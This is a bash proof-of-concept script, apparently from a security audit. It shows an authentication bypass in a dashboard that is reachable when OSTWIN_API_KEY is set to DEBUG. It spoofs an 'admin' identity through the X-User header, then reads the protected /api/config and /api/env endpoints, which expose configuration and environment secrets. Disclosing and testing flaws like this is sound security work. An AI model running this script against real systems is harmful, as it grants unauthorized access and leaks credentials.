#!/usr/bin/env bash
# PoC: H1 — DEBUG Auth Bypass (OSTWIN_API_KEY=DEBUG)
# CVE-class: CWE-288 — Authentication Bypass Using an Alternate Path
# Affected: dashboard/auth.py:78-81
#
# When OSTWIN_API_KEY=DEBUG the get_current_user dependency returns
# immediately without validating any credential.  The X-User header
# value is used verbatim as the authenticated identity.
#
# Precondition: dashboard running with OSTWIN_API_KEY=DEBUG on :9000

TARGET="${1:-http://localhost:9000}"

echo "[*] H1 DEBUG Auth Bypass PoC"
echo "[*] Target: $TARGET"
echo ""

# --- Step 1: confirm 401 on a protected endpoint (sanity check) ---
echo "[1] Probing /api/status without credentials (expect 401 when key is set):"
curl -s -o /dev/null -w "    HTTP %{http_code}\n" "$TARGET/api/status"

# --- Step 2: bypass auth — no credentials supplied at all ---
echo ""
echo "[2] Bypassing auth with no credentials (OSTWIN_API_KEY=DEBUG active):"
RESP=$(curl -s -w "\n__HTTP_%{http_code}__" "$TARGET/api/status")
CODE=$(echo "$RESP" | grep -o '__HTTP_[0-9]*__' | tr -d '_HTTP_')
BODY=$(echo "$RESP" | sed 's/__HTTP_[0-9]*__//')
echo "    HTTP $CODE"
echo "    Body: $BODY"

if [ "$CODE" = "200" ]; then
    echo "    [PASS] Auth bypassed — unauthenticated request returned 200"
else
    echo "    [NOTE] Got $CODE — server may not be running in DEBUG mode"
fi

# --- Step 3: identity spoofing via X-User header ---
echo ""
echo "[3] Spoofing identity as 'admin' via X-User header:"
RESP2=$(curl -s -H "X-User: admin" -w "\n__HTTP_%{http_code}__" "$TARGET/api/status")
CODE2=$(echo "$RESP2" | grep -o '__HTTP_[0-9]*__' | tr -d '_HTTP_')
echo "    HTTP $CODE2"
echo "    X-User: admin accepted — identity is whatever the header says"

# --- Step 4: access a sensitive endpoint (/api/config) ---
echo ""
echo "[4] Reading /api/config (protected — contains agent configuration):"
curl -s "$TARGET/api/config" | head -c 500
echo ""

# --- Step 5: read .env file via /api/env ---
echo ""
echo "[5] Reading environment variables via /api/env:"
curl -s "$TARGET/api/env" | head -c 500
echo ""

echo ""
echo "[*] PoC complete. All authenticated endpoints are open when OSTWIN_API_KEY=DEBUG."
